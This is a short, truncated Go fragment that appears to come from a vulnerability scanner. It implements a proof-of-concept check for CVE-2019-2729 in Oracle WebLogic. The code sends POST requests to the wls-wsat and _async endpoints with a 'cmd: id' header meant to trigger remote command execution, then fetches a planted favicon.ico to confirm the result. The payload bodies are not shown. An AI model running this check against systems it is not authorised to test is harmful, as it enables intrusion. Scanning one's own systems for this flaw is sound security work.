...
func CVE_2019_2729(url string, client *httpx.Client) bool {
	...
	header["cmd"] = "id"
	header["SOAPAction"] = ""
	if req1, err := client.Request(url+"/wls-wsat/CoordinatorPortType", "POST", payload1, header, "Poc WebLogic"); err == nil {
		if req2, err2 := client.Request(url+"/_async/AsyncResponseService", "POST", payload2, header, "Poc WebLogic"); err2 == nil {
			req3, _ := client.Request(url+"/_async/favicon.ico", "GET", "", nil, "Poc WebLogic")
